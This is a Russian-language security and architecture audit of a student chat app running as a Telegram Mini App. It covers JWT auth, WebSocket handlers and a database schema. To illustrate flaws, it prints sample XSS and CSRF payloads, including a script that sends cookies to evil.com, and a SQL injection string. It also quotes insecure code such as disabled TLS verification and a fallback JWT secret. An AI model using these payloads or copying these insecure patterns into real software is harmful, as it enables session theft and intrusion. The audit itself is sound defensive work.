# Полный отчет о проекте AguGram - Студенческая социальная сеть

**Дата создания отчета:** 15 января 2025  
**Версия проекта:** MVP 1.0  
**Статус:** Требует доработки перед продакшеном

---

## 📋 Содержание

1. [Обзор проекта](#обзор-проекта)
2. [Текущий функционал](#текущий-функционал)
3. [Архитектура системы](#архитектура-системы)
4. [База данных](#база-данных)
5. [Система аутентификации и безопасность](#система-аутентификации-и-безопасность)
6. [WebSocket и реального времени коммуникация](#websocket-и-реального-времени-коммуникация)
7. [Критические проблемы и уязвимости](#критические-проблемы-и-уязвимости)
8. [Список необходимых улучшений](#список-необходимых-улучшений)
9. [Рекомендации перед продакшеном](#рекомендации-перед-продакшеном)

---

## 🎯 Обзор проекта

### Назначение
AguGram - это анонимная социальная сеть для студентов, работающая как Telegram Mini App. Приложение предоставляет платформу для анонимного общения студентов с сохранением приватности.

### Целевая аудитория
- Студенты высших учебных заведений
- Пользователи Telegram
- Возрастная группа: 18-25 лет

### Основные возможности
- Анонимная регистрация через Telegram
- Глобальный чат для всех пользователей
- Профили с минимальной информацией (курс, направление, био)
- Real-time сообщения через WebSocket
- Telegram бот для доступа к приложению

---

## ✨ Текущий функционал

### Реализованные возможности

#### 1. Система регистрации
- **Местоположение:** `client/src/pages/registration.tsx`
- **Описание:** Трехэтапная форма регистрации
- **Этапы:**
  1. Личная информация (имя, пол, курс, направление, био)
  2. Социальные сети (Telegram, Instagram, VK) - опционально
  3. Фотографии профиля - опционально (UI готов, загрузка не реализована)

**Валидация:**
- Имя пользователя: 3-32 символа, только латиница, цифры, `_` и `-`
- Проверка уникальности имени через API `/api/check-username/:username`
- Обязательные поля: имя, пол, курс, направление

**Схема Zod для валидации профиля:**
```typescript
displayName: z.string().min(3).max(32).regex(/^[A-Za-z0-9_-]+$/),
course: z.enum(["1", "2", "3", "4", "5", "6"]),
direction: z.string().min(1),
bio: z.string().optional(),
gender: z.enum(["male", "female"]),
socialLinks: z.array(z.string()).optional(),
photos: z.array(z.string().url()).optional()
```

#### 2. Система аутентификации
- **JWT токены:** 
  - Access token: 15 минут
  - Refresh token: 7 дней
- **Автогенерация анонимных имен:** `Student_{user.id}`
- **Dev режим:** Автоматическая аутентификация с `tgId=999999`
- **Telegram initData:** Верификация через HMAC-SHA256 (реализовано, но не используется)

**Структура JWT payload:**
```typescript
{
  userId: number;
  anonName: string;
  status: string;
  iat: number;
}
```

#### 3. Глобальный чат
- **Местоположение:** `client/src/pages/chat.tsx`
- **Функции:**
  - Отображение истории сообщений (последние 50)
  - Отправка сообщений в реальном времени
  - Показ анонимных имен отправителей
  - Индикатор подключения к WebSocket
  - Счетчик пользователей онлайн (мок-данные)

**Ограничения сообщений:**
- Максимальная длина: 1000 символов
- Не может быть пустым (после trim)
- Валидация через `insertMessageSchema` (Zod)

#### 4. Telegram бот
- **Местоположение:** `server/telegram-bot.ts`
- **Команды:**
  - `/start` - регистрация и вход в приложение
  - Автосоздание пользователей при первом контакте
  - Inline кнопка для запуска WebApp

**Логика работы:**
- При `/start` проверяется существование пользователя
- Новые пользователи создаются автоматически со статусом `approved`
- В dev режиме все пользователи автоматически одобряются
- Отправка WebApp кнопки с URL приложения

#### 5. API Endpoints

**Аутентификация:**
- `POST /api/auth` - аутентификация через Telegram initData
- `POST /api/auth/dev` - dev-only endpoint для разработки
- `POST /api/auth/refresh` - обновление access токена

**Профиль:**
- `GET /api/profile` - получение профиля (требует auth)
- `PATCH /api/profile` - обновление профиля (требует auth)
- `GET /api/check-username/:username` - проверка уникальности имени

**Сообщения:**
- `GET /api/messages/:roomId?` - получение истории чата
- WebSocket `/ws` - реального времени обмен сообщениями

#### 6. UI/UX компоненты
- **Градиентный дизайн:** От `#C42DFF` до `#4A90FF`
- **Темная тема:** Градиент от `#0A1A2F` до черного
- **Анимации:** Framer Motion для плавных переходов
- **Компоненты:** shadcn/ui (Radix UI + Tailwind CSS)
- **Адаптивность:** Mobile-first дизайн для Telegram WebApp

**Основные страницы:**
- `/entry` - Landing с приветствием
- `/register` - Регистрация профиля
- `/` - Главная страница с описанием
- `/chat` - Глобальный чат
- `/profile` - Профиль пользователя

---

## 🏗️ Архитектура системы

### Технологический стек

#### Frontend
```json
{
  "framework": "React 18.3.1",
  "buildTool": "Vite 5.4.19",
  "routing": "Wouter 3.3.5",
  "stateManagement": "TanStack Query 5.60.5",
  "styling": "Tailwind CSS 3.4.17",
  "components": "shadcn/ui (Radix UI)",
  "animations": "Framer Motion 11.18.2",
  "language": "TypeScript 5.6.3"
}
```

**Структура проекта (Frontend):**
```
client/
├── src/
│   ├── components/
│   │   ├── ui/              # shadcn/ui компоненты
│   │   ├── layout.tsx       # Основной layout с навигацией
│   │   ├── chat-interface.tsx
│   │   ├── bottom-navigation.tsx
│   │   └── dev-mode-button.tsx
│   ├── pages/
│   │   ├── entry.tsx        # Landing page
│   │   ├── registration.tsx # Регистрация
│   │   ├── home.tsx         # Главная
│   │   ├── chat.tsx         # Чат
│   │   ├── chats.tsx        # Список чатов (заготовка)
│   │   └── profile.tsx      # Профиль
│   ├── lib/
│   │   ├── auth.ts          # AuthManager singleton
│   │   ├── queryClient.ts   # React Query config
│   │   ├── telegram.ts      # Telegram WebApp SDK
│   │   └── utils.ts         # Утилиты
│   ├── hooks/
│   │   ├── use-mobile.tsx
│   │   └── use-toast.ts
│   ├── App.tsx              # Main app component
│   └── main.tsx             # Entry point
├── index.html
└── index.css
```

#### Backend
```json
{
  "runtime": "Node.js",
  "framework": "Express 4.21.2",
  "database": "PostgreSQL (Neon)",
  "orm": "Drizzle ORM 0.39.1",
  "websocket": "ws 8.18.0",
  "authentication": "JWT (jsonwebtoken 9.0.2)",
  "telegram": "node-telegram-bot-api 0.66.0",
  "language": "TypeScript 5.6.3"
}
```

**Структура проекта (Backend):**
```
server/
├── index.ts         # Entry point, Express setup
├── routes.ts        # API endpoints & HTTP server
├── auth.ts          # JWT generation & verification
├── websocket.ts     # WebSocket server & handlers
├── db.ts            # Database connection (Neon)
├── storage.ts       # Database operations (Drizzle)
├── telegram-bot.ts  # Telegram bot logic
└── vite.ts          # Vite dev server integration

shared/
└── schema.ts        # Drizzle schema & Zod validation
```

### Паттерны и архитектурные решения

#### 1. Клиент-серверная архитектура
- **Separation of Concerns:** Четкое разделение frontend и backend
- **RESTful API:** Для CRUD операций
- **WebSocket:** Для real-time коммуникации
- **Shared Schema:** Типы и валидация между клиентом и сервером

#### 2. State Management
- **Server State:** TanStack Query для кэширования и синхронизации
- **Client State:** React useState и контекст
- **Auth State:** Singleton AuthManager с localStorage persistence
- **WebSocket State:** Local state в ChatPage

#### 3. Authentication Flow (Текущая реализация)

**Development mode:**
```
Client → Auto-auth with dev user (tgId=999999) → Store in localStorage
         ↓
         Always "authenticated" without real JWT
```

**Production mode (Задумано, но не работает):**
```
1. Telegram WebApp → initData
2. Client → POST /api/auth {initData}
3. Server → Verify HMAC → Generate JWT
4. Client → Store tokens → Use for API/WebSocket
```

**Проблема:** Frontend никогда не отправляет настоящий initData и не получает реальные JWT токены.

#### 4. Database Access Pattern
```
API/WebSocket → storage.ts (interface) → db.ts (Drizzle) → PostgreSQL
```

**Преимущества:**
- Абстракция над ORM
- Легко тестировать (можно мок storage)
- Централизованные database operations

---

## 🗄️ База данных

### Схема PostgreSQL (Drizzle ORM)

#### Таблица `users`
```typescript
pgTable("users", {
  id: serial("id").primaryKey(),
  tgId: bigint("tg_id", { mode: "bigint" }).unique(),
  username: text("username"),
  anonName: text("anon_name"),
  status: text("status", { 
    enum: ["pending", "approved", "rejected"] 
  }).notNull().default("pending"),
  
  // Профильные данные
  displayName: text("display_name").unique(),
  course: text("course", { enum: ["1","2","3","4","5","6"] }),
  direction: text("direction"),
  bio: text("bio"),
  gender: text("gender", { enum: ["male", "female"] }),
  avatarUrl: text("avatar_url"),
  socialLinks: text("social_links").array(),
  photos: text("photos").array(),
  profileCompleted: text("profile_completed", { 
    enum: ["true", "false"] 
  }).default("false"),
  
  createdAt: timestamp("created_at").defaultNow().notNull(),
})
```

**Индексы:**
- PRIMARY KEY на `id`
- UNIQUE на `tgId`
- UNIQUE на `displayName`

**Проблемы:**
- ❌ Нет индексов на часто запрашиваемые поля (`status`, `createdAt`)
- ❌ `profileCompleted` как text enum вместо boolean
- ❌ `socialLinks` и `photos` как text[] без валидации формата
- ❌ `avatarUrl` не валидируется на корректность URL

#### Таблица `rooms`
```typescript
pgTable("rooms", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  type: text("type").notNull().default("global"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
})
```

**Использование:**
- Глобальная комната: `{name: "global", type: "global"}`
- Создается автоматически при первом обращении
- Приватные комнаты не реализованы

#### Таблица `messages`
```typescript
pgTable("messages", {
  id: serial("id").primaryKey(),
  roomId: integer("room_id").references(() => rooms.id).notNull(),
  userId: integer("user_id").references(() => users.id),
  content: text("content").notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
})
```

**Отношения:**
```typescript
// users.messages - один ко многим
// rooms.messages - один ко многим  
// messages.user - многие к одному
// messages.room - многие к одному
```

**Проблемы:**
- ❌ Нет индекса на `roomId` (частые JOIN запросы)
- ❌ Нет индекса на `createdAt` (сортировка)
- ❌ `userId` nullable - системные сообщения?
- ❌ Нет ограничения длины `content` на уровне БД
- ❌ Отсутствует soft delete или архивирование

### Database Operations (storage.ts)

#### Методы интерфейса IStorage:
```typescript
interface IStorage {
  // Users
  getUserById(id: number): Promise<User | undefined>;
  getUserByTgId(tgId: bigint): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUserStatus(id, status): Promise<User | undefined>;
  getPendingUsers(): Promise<User[]>;
  updateUserProfile(id, profile): Promise<User | undefined>;
  markProfileCompleted(id: number): Promise<User | undefined>;
  
  // Messages
  getMessagesByRoomId(roomId, limit?): Promise<(Message & { user })[]>;
  createMessage(message: InsertMessage): Promise<Message>;
  
  // Rooms
  getRoomById(id: number): Promise<Room | undefined>;
  createRoom(room: InsertRoom): Promise<Room>;
  getOrCreateGlobalRoom(): Promise<Room>;
}
```

**Особенности реализации:**
- Автогенерация `anonName` как `Student_{id}` после создания
- LEFT JOIN при получении сообщений для включения user данных
- Reverse сортировка сообщений (новые внизу)
- Limit по умолчанию: 50 сообщений

**Отсутствующий функционал:**
- ❌ Пагинация сообщений
- ❌ Поиск по сообщениям
- ❌ Удаление сообщений
- ❌ Редактирование сообщений
- ❌ Блокировка пользователей
- ❌ Приватные комнаты

### Database Connection (db.ts)

```typescript
// Neon Serverless PostgreSQL
import { Pool, neonConfig } from '@neondatabase/serverless';
import { drizzle } from 'drizzle-orm/neon-serverless';
import ws from "ws";

neonConfig.webSocketConstructor = ws;

// В dev отключается SSL верификация
if (process.env.NODE_ENV === 'development') {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
}

const pool = new Pool({ 
  connectionString: process.env.DATABASE_URL 
});
const db = drizzle({ client: pool, schema });
```

**Конфигурация:**
- WebSocket поддержка для Neon
- Connection pooling
- Отключение SSL verify в dev (⚠️ небезопасно для production)

---

## 🔐 Система аутентификации и безопасность

### Реальное состояние аутентификации

#### ❌ Критическая проблема: Аутентификация не работает

**Frontend (client/src/lib/auth.ts):**
```typescript
// AuthManager hardcode в dev режиме
constructor() {
  this.loadFromStorage(); // Загружает из localStorage
  this.scheduleTokenRefresh(); // Планирует обновление
}

// В App.tsx автоматически устанавливается dev юзер:
if (import.meta.env.DEV && !auth.user) {
  auth.setAuthData({
    user: { id: 999999, anonName: 'Student_999999', ... },
    token: 'dev_token',
    refreshToken: 'dev_refresh_token'
  });
}
```

**Проблема:** 
- Frontend НИКОГДА не получает настоящие JWT токены
- В dev режиме использует hardcoded `'dev_token'`
- В production режиме пытается загрузить из localStorage, но там пусто
- WebSocket отправляет этот фейковый токен

**Telegram initData верификация:**
```typescript
// server/routes.ts - реализовано, но не используется
function verifyInitData(initData: string, botToken: string): boolean {
  // 1. Парсинг параметров
  const params = initData.split('&').map(p => p.split('='));
  const kv: Record<string, string> = {};
  
  // 2. Извлечение hash
  const hash = kv['hash'];
  
  // 3. Создание data_check_string
  const keys = Object.keys(kv).filter(k => k !== 'hash').sort();
  const data_check_string = keys.map(k => `${k}=${kv[k]}`).join('\n');
  
  // 4. Вычисление HMAC
  const secret = crypto.createHash('sha256').update(botToken).digest();
  const hmac = crypto.createHmac('sha256', secret)
    .update(data_check_string).digest('hex');
  
  // 5. Timing-safe сравнение
  return crypto.timingSafeEqual(
    Buffer.from(hmac, 'hex'), 
    Buffer.from(hash, 'hex')
  );
}
```

**Состояние:** Функция верификации написана корректно (HMAC-SHA256 по стандарту Telegram), но НЕ ВЫЗЫВАЕТСЯ из клиента.

### JWT Токены

#### Генерация токенов (server/auth.ts)

**Access Token (15 минут):**
```typescript
function generateAuthToken(user: AuthUser): string {
  const payload = {
    userId: user.id,
    anonName: user.anonName,
    status: user.status,
    iat: Math.floor(Date.now() / 1000),
  };
  
  return jwt.sign(payload, getJwtSecret(), { expiresIn: '15m' });
}
```

**Refresh Token (7 дней):**
```typescript
function generateRefreshToken(user: AuthUser): string {
  const payload = {
    userId: user.id,
    anonName: user.anonName,
    status: user.status,
    type: 'refresh',
    iat: Math.floor(Date.now() / 1000),
  };
  
  return jwt.sign(payload, getJwtSecret(), { expiresIn: '7d' });
}
```

**JWT Secret:**
```typescript
function getJwtSecret(): string {
  const secret = process.env.JWT_SECRET;
  
  // Production проверка
  if (process.env.NODE_ENV === 'production' && !secret) {
    console.error('FATAL: JWT_SECRET is required in production');
    process.exit(1);
  }
  
  // Fallback для dev (⚠️ ОПАСНО!)
  return secret || 
         process.env.SESSION_SECRET || 
         'fallback-dev-secret-change-in-production';
}
```

**Проблемы:**
- ⚠️ Fallback secret в production если JWT_SECRET отсутствует
- ❌ Нет ротации refresh токенов
- ❌ Нет invalidation/blacklist для токенов
- ❌ Статус пользователя в токене не обновляется до refresh

#### Token Refresh Flow (Задуман, но не работает)

**POST /api/auth/refresh:**
```typescript
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  // 1. Verify refresh token
  const tokenData = verifyRefreshToken(refreshToken);
  if (!tokenData) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
  
  // 2. Get current user
  const user = await storage.getUserById(tokenData.userId);
  
  // 3. Check status match (инвалидация при смене статуса)
  if (user.status !== tokenData.status) {
    return res.status(401).json({ 
      error: 'User status changed. Re-authenticate' 
    });
  }
  
  // 4. Generate new tokens
  const newToken = generateAuthToken(user);
  const newRefreshToken = generateRefreshToken(user);
  
  res.json({ user, token: newToken, refreshToken: newRefreshToken });
});
```

**Frontend refresh планирование:**
```typescript
// client/src/lib/auth.ts
private scheduleTokenRefresh() {
  const refreshDelay = TOKEN_LIFETIME - TOKEN_REFRESH_BUFFER; // 13 min
  
  this.refreshTimer = setTimeout(() => {
    this.refreshToken().catch(error => {
      console.error('Auto refresh failed:', error);
      this.updateAuthState({ 
        token: null, 
        refreshToken: null, 
        status: 'expired' 
      });
    });
  }, refreshDelay);
  
  console.log(`Token refresh in ${refreshDelay / 1000 / 60} min`);
}
```

**Проблема:** AuthManager планирует refresh, но токены в localStorage - фейковые, поэтому refresh никогда не происходит.

### Authorization Middleware

```typescript
function requireAuth(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Token required' });
  }
  
  const token = authHeader.substring(7);
  const user = verifyAuthToken(token);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid token' });
  }
  
  req.user = user; // Добавляет в request
  next();
}
```

**Использование:**
- `GET /api/profile` - требует auth
- `PATCH /api/profile` - требует auth
- Другие endpoints - публичные

**Проблемы:**
- ❌ Нет проверки статуса пользователя
- ❌ Нет role-based access control
- ❌ Нет rate limiting

### Development Auth Endpoint

**POST /api/auth/dev - только для разработки:**

```typescript
app.post('/api/auth/dev', async (req, res) => {
  // 1. Проверка NODE_ENV
  if (process.env.NODE_ENV === 'production') {
    console.warn(`[SECURITY] Dev endpoint blocked in production`);
    return res.status(403).json({ error: 'Not available' });
  }
  
  // 2. Проверка DEV_MODE flag
  if (process.env.DEV_MODE !== 'true') {
    return res.status(403).json({ error: 'DEV_MODE disabled' });
  }
  
  // 3. Проверка длины JWT_SECRET (защита от production)
  const jwtSecret = process.env.JWT_SECRET;
  if (jwtSecret && jwtSecret.length > 50) {
    return res.status(403).json({ 
      error: 'Not available with production secrets' 
    });
  }
  
  // 4. Создание dev юзера
  const { tgId } = req.body;
  const targetTgId = tgId ? BigInt(tgId) : BigInt(999999);
  
  let user = await storage.getUserByTgId(targetTgId);
  if (!user) {
    user = await storage.createUser({
      tgId: targetTgId,
      username: null,
      status: 'approved',
    });
  }
  
  // 5. Генерация токенов
  const token = generateAuthToken(user);
  const refreshToken = generateRefreshToken(user);
  
  res.json({ user, status: user.status, token, refreshToken });
});
```

**Защита (многоуровневая):**
1. ✅ NODE_ENV !== 'production'
2. ✅ DEV_MODE === 'true'
3. ✅ JWT_SECRET длиной < 50 символов

**Проблема:** Если NODE_ENV случайно не установлен в production, endpoint доступен!

### Уязвимости безопасности

#### 🔴 Критические

1. **Authentication Bypass в Development**
   - Dev endpoint создает authenticated юзеров без верификации
   - Если NODE_ENV не "production", доступен всем
   - Можно создать пользователей с любым tgId

2. **WebSocket Authentication Broken**
   - Frontend отправляет фейковый токен `'dev_token'`
   - В production WebSocket отклонит соединение
   - Чат НЕ РАБОТАЕТ в production

3. **Telegram initData Not Used**
   - Функция верификации написана, но не вызывается
   - POST /api/auth игнорирует проверку в dev режиме
   - Любой может авторизоваться без Telegram

4. **Fallback JWT Secret**
   - `'fallback-dev-secret-change-in-production'` доступен если JWT_SECRET пуст
   - Предсказуемый секрет = подделка токенов

5. **No Token Revocation**
   - Невозможно invalidate токены при logout
   - Украденные токены работают до истечения
   - Смена пароля не сбрасывает сессии

#### 🟠 Высокий приоритет

6. **XSS Vulnerability**
   - Сообщения не санитизируются перед сохранением
   - `content` отображается как есть в UI
   - Возможна инъекция JavaScript через сообщения

7. **SQL Injection (низкий риск)**
   - Использование Drizzle ORM защищает
   - Но нет валидации на некоторые поля (direction, bio)

8. **CSRF Protection Missing**
   - Нет CSRF токенов
   - Нет SameSite cookie атрибутов
   - API доступен с любого origin

9. **Rate Limiting Absent**
   - Нет ограничений на запросы
   - Возможен DDoS или spam
   - WebSocket может быть перегружен сообщениями

10. **SSL Verification Disabled in Dev**
    ```typescript
    if (process.env.NODE_ENV === 'development') {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
    }
    ```
    - Если переменная утекает в production = MITM атаки

#### 🟡 Средний приоритет

11. **Sensitive Data in Logs**
    - initData логируется с предпросмотром
    - Токены могут попасть в логи при ошибках

12. **No Input Sanitization**
    - Bio, direction, social links не санитизируются
    - Возможны long strings = DoS

13. **localStorage for Tokens**
    - Уязвимо к XSS
    - Лучше использовать httpOnly cookies

### Что НЕ реализовано в безопасности

❌ **Encryption at Rest** - данные в БД не зашифрованы  
❌ **End-to-End Encryption** - заявлено в UI, но отсутствует  
❌ **2FA/MFA** - дополнительная аутентификация  
❌ **Password Hashing** - нет паролей вообще  
❌ **Audit Logging** - логи действий пользователей  
❌ **IP Whitelisting** - защита админ функций  
❌ **Content Security Policy** - CSP headers  
❌ **Subresource Integrity** - SRI для CDN  

---

## 🔌 WebSocket и реального времени коммуникация

### WebSocket Server (server/websocket.ts)

#### Инициализация
```typescript
import { WebSocketServer, WebSocket } from 'ws';

export function setupWebSocket(server: Server) {
  const wss = new WebSocketServer({ 
    server, 
    path: '/ws' 
  });
  
  wss.on('connection', (ws: AuthenticatedWebSocket) => {
    console.log('WebSocket connection established');
    
    ws.on('message', async (data) => {
      const message = JSON.parse(data.toString());
      
      switch (message.type) {
        case 'auth': await handleAuth(ws, message); break;
        case 'send_message': await handleSendMessage(ws, message); break;
        case 'join_room': await handleJoinRoom(ws, message); break;
        default: ws.send(JSON.stringify({ 
          type: 'error', 
          message: 'Unknown type' 
        }));
      }
    });
  });
}
```

#### Authentication Handler

```typescript
async function handleAuth(ws: AuthenticatedWebSocket, message: any) {
  const { token } = message;
  
  // Dev mode bypass (⚠️ ОПАСНО!)
  if (!token && process.env.NODE_ENV !== 'production') {
    console.log('[WebSocket] Dev mode: Creating anon user');
    
    let user = await storage.getUserByTgId(BigInt(999999));
    if (!user) {
      user = await storage.createUser({
        tgId: BigInt(999999),
        username: null,
        status: 'approved',
      });
    }
    
    ws.userId = user.id;
    ws.userStatus = user.status;
    
    // Send history
    const globalRoom = await storage.getOrCreateGlobalRoom();
    const messages = await storage.getMessagesByRoomId(globalRoom.id, 50);
    
    ws.send(JSON.stringify({
      type: 'auth_success',
      user: { id: user.id, anonName: user.anonName, status: user.status },
      roomId: globalRoom.id
    }));
    
    ws.send(JSON.stringify({
      type: 'chat_history',
      messages: messages.map(msg => ({...}))
    }));
    
    return;
  }
  
  // Production auth
  if (!token) {
    ws.send(JSON.stringify({
      type: 'auth_error',
      message: 'Authentication token required',
      code: 'NO_TOKEN'
    }));
    ws.close(1008, 'Authentication required');
    return;
  }
  
  // Verify JWT
  const tokenData = verifyAuthToken(token);
  if (!tokenData) {
    ws.send(JSON.stringify({
      type: 'auth_error',
      message: 'Invalid or expired token',
      code: 'INVALID_TOKEN'
    }));
    ws.close(1008, 'Invalid token');
    return;
  }
  
  // Get user from DB
  const user = await storage.getUserById(tokenData.userId);
  if (!user) {
    ws.send(JSON.stringify({ type: 'auth_error', message: 'User not found' }));
    ws.close(1008, 'User not found');
    return;
  }
  
  // Store user in WebSocket
  ws.userId = user.id;
  ws.userStatus = user.status;
  
  // Load and send chat history
  const globalRoom = await storage.getOrCreateGlobalRoom();
  const messages = await storage.getMessagesByRoomId(globalRoom.id, 50);
  
  ws.send(JSON.stringify({ type: 'auth_success', ... }));
  ws.send(JSON.stringify({ type: 'chat_history', messages }));
}
```

**Проблемы:**
- ⚠️ Dev bypass создает пользователя автоматически
- ❌ Нет rate limiting на auth attempts
- ❌ В production клиент отправит `'dev_token'` → отклонение

#### Send Message Handler

```typescript
async function handleSendMessage(ws: AuthenticatedWebSocket, message: any) {
  // Auth check
  if (!ws.userId) {
    ws.send(JSON.stringify({ type: 'error', message: 'Not authenticated' }));
    return;
  }
  
  const { content, roomId } = message;
  const globalRoom = await storage.getOrCreateGlobalRoom();
  const targetRoomId = roomId || globalRoom.id;
  
  // Validate with Zod schema
  const messageData = {
    content: content,
    userId: ws.userId,
    roomId: targetRoomId
  };
  
  const validation = insertMessageSchema.safeParse(messageData);
  if (!validation.success) {
    ws.send(JSON.stringify({
      type: 'error',
      message: `Invalid: ${validation.error.issues.map(i => i.message).join(', ')}`
    }));
    return;
  }
  
  // Content validation
  const trimmedContent = content?.trim();
  if (!trimmedContent || trimmedContent.length === 0) {
    ws.send(JSON.stringify({ type: 'error', message: 'Content empty' }));
    return;
  }
  
  if (trimmedContent.length > 1000) {
    ws.send(JSON.stringify({ type: 'error', message: 'Too long (max 1000)' }));
    return;
  }
  
  // Create message in DB
  const newMessage = await storage.createMessage({
    content: trimmedContent,
    userId: ws.userId,
    roomId: targetRoomId
  });
  
  const user = await storage.getUserById(ws.userId);
  
  // Broadcast to ALL connected clients
  const broadcastData = JSON.stringify({
    type: 'new_message',
    message: {
      id: newMessage.id,
      content: newMessage.content,
      createdAt: newMessage.createdAt,
      user: { id: user?.id, anonName: user?.anonName }
    }
  });
  
  wss.clients.forEach((client: AuthenticatedWebSocket) => {
    if (client.readyState === WebSocket.OPEN && client.userId) {
      client.send(broadcastData);
    }
  });
}
```

**Валидация сообщений:**
- ✅ Zod schema validation
- ✅ Trim и проверка на пустоту
- ✅ Максимальная длина 1000 символов
- ❌ Нет санитизации HTML/XSS
- ❌ Нет rate limiting (можно спамить)

#### Broadcast Logic

**Текущая реализация:**
```typescript
wss.clients.forEach((client: AuthenticatedWebSocket) => {
  if (client.readyState === WebSocket.OPEN && client.userId) {
    client.send(broadcastData);
  }
});
```

**Проблемы:**
- ✅ Проверяет, что клиент подключен (readyState === OPEN)
- ✅ Проверяет, что клиент аутентифицирован (userId exists)
- ❌ Нет разделения по комнатам (все получают все сообщения)
- ❌ Нет проверки permissions (блокировка, модерация)

### Frontend WebSocket (client/src/pages/chat.tsx)

#### Подключение

```typescript
const connectWebSocket = async () => {
  const currentUser = auth.user || simpleUser;
  if (!currentUser) return;
  
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  const wsUrl = `${protocol}//${window.location.host}/ws`;
  
  const ws = new WebSocket(wsUrl);
  wsRef.current = ws;
  
  ws.onopen = () => {
    console.log('WebSocket connected');
    setIsConnected(true);
    
    // Send auth without token (⚠️ ПРОБЛЕМА!)
    ws.send(JSON.stringify({ type: 'auth' }));
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    
    switch (data.type) {
      case 'auth_success':
        setRoomId(data.roomId);
        break;
      case 'auth_error':
        console.error('WebSocket auth error:', data.message);
        break;
      case 'chat_history':
        setMessages(data.messages || []);
        break;
      case 'new_message':
        setMessages(prev => [...prev, data.message]);
        break;
      case 'error':
        toast({ variant: "destructive", title: "Ошибка", description: data.message });
        break;
    }
  };
  
  ws.onclose = () => {
    console.log('WebSocket disconnected');
    setIsConnected(false);
    
    // Auto reconnect after 3 seconds
    setTimeout(() => {
      if (auth.user && auth.token) {
        connectWebSocket();
      }
    }, 3000);
  };
  
  ws.onerror = (error) => {
    console.error('WebSocket error:', error);
    setIsConnected(false);
  };
};
```

**Критическая проблема:** 
```typescript
ws.send(JSON.stringify({ type: 'auth' })); // БЕЗ ТОКЕНА!
```

Должно быть:
```typescript
const token = await auth.getValidToken();
ws.send(JSON.stringify({ type: 'auth', token }));
```

#### Отправка сообщений

```typescript
const handleSendMessage = (content: string) => {
  if (wsRef.current && isConnected) {
    wsRef.current.send(JSON.stringify({
      type: 'send_message',
      content,
      roomId
    }));
  }
};
```

**Простая реализация без:**
- ❌ Offline queuing
- ❌ Send confirmations
- ❌ Retry logic
- ❌ Optimistic updates

### Message Flow Diagram

```
Frontend                    Backend                     Database
   |                           |                            |
   |--[1] WebSocket connect -->|                            |
   |<--[2] Connection OK-------|                            |
   |                           |                            |
   |--[3] {type:'auth'} ------>|                            |
   |                           |--[4] Verify (FAILS!)       |
   |                           |                            |
   |                           |--[5] getUserById(999999)-->|
   |                           |<--[6] user data-----------|
   |                           |                            |
   |<--[7] auth_success--------|                            |
   |<--[8] chat_history--------|<--[9] getMessages(roomId)-|
   |                           |                            |
   |--[10] {type:'send_msg'}-->|                            |
   |                           |--[11] Validate content     |
   |                           |--[12] createMessage()----->|
   |                           |<--[13] newMessage---------|
   |                           |                            |
   |<--[14] new_message--------|--[15] Broadcast to all--->|
   |                           |                            |
```

**Проблемные этапы:**
- [3-4]: Фейковая аутентификация без токена
- [5]: Fallback на dev юзера (bypass)
- [15]: Broadcast без фильтрации по комнатам

---

## 🚨 Критические проблемы и уязвимости

### 1. Аутентификация полностью сломана

**Описание:**
- Frontend никогда не получает настоящие JWT токены
- В dev использует хардкод `'dev_token'`
- В production localStorage пуст → приложение не работает
- WebSocket отправляет фейковый токен → отклоняется в production

**Почему критично:**
- Невозможно запустить в production
- Нет защиты от неавторизованного доступа
- Telegram интеграция не используется

**Как исправить:**
1. Реализовать получение `initData` из Telegram WebApp
2. Отправить на `/api/auth` для верификации
3. Получить настоящие JWT токены
4. Сохранить в localStorage
5. Использовать в WebSocket и API запросах

### 2. WebSocket уязвим к abuse

**Описание:**
- Нет rate limiting на сообщения
- Нет санитизации контента (XSS)
- Dev bypass позволяет подключение без токена
- Broadcast не фильтрует по комнатам

**Потенциальные атаки:**
- Spam flood
- XSS через сообщения
- DoS через множественные подключения
- Подделка сообщений через dev endpoint

**Как исправить:**
1. Добавить rate limiting (например, 10 сообщений/минуту)
2. Санитизировать HTML в сообщениях (DOMPurify)
3. Убрать dev bypass или защитить лучше
4. Реализовать room-based broadcasting

### 3. Отсутствует CSRF защита

**Описание:**
- API endpoints доступны с любого origin
- Нет CSRF токенов
- Cookie без SameSite атрибута

**Потенциальная атака:**
```html
<!-- Злонамеренный сайт -->
<form action="https://agugram.app/api/profile" method="POST">
  <input name="displayName" value="hacked" />
  <input name="bio" value="<script>alert('XSS')</script>" />
</form>
<script>document.forms[0].submit();</script>
```

**Как исправить:**
1. Добавить CORS policy с whitelist
2. Использовать SameSite cookies
3. Добавить CSRF токены или Double Submit Cookie

### 4. XSS через пользовательский контент

**Описание:**
- Сообщения не санитизируются
- Bio, direction, social links отображаются как есть
- Возможна инъекция JavaScript

**Пример атаки:**
```typescript
// Отправить сообщение:
{
  content: "<img src=x onerror='alert(document.cookie)'>"
}

// Или в профиле:
{
  bio: "<script>fetch('https://evil.com?cookies='+document.cookie)</script>"
}
```

**Как исправить:**
1. Санитизировать на backend: `import DOMPurify from 'isomorphic-dompurify'`
2. Использовать Content Security Policy headers
3. Escape HTML в React компонентах
4. Валидировать social links как URLs

### 5. SQL Injection (низкий риск)

**Описание:**
- Drizzle ORM защищает от большинства атак
- Но некоторые поля (direction) не валидируются

**Потенциальная атака:**
```typescript
// Если бы использовался raw SQL:
const direction = "'; DROP TABLE users; --";
db.execute(`INSERT INTO users (direction) VALUES ('${direction}')`);
```

**Состояние:**
✅ Drizzle использует параметризованные запросы  
⚠️ Но нужна валидация длины и символов

**Как исправить:**
1. Добавить Zod схемы для всех полей
2. Ограничить длину строк
3. Запретить специальные символы где не нужны

### 6. Слабая защита dev endpoints

**Описание:**
- `/api/auth/dev` защищен только ENV переменными
- Если NODE_ENV не установлен → endpoint доступен
